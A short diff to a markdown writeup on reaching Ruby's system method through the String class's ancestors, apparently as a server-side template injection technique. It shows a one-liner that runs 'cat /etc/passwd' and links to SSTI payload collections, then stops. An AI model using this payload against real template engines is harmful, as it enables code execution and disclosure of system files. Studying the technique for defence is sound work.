@@ -1,5 +1,5 @@
 # Using Ruby ancestors to Execute Code via the String class
-## tldr/oneliner;
+## tldr/oneliner
 `ruby -e '"".class.ancestors[3].system("cat /etc/passwd")'`
 ## Why?
 So I was doing a bit of reading on [SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection), specifically that of [Jinja/python](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---remote-code-execution) which looks like this:
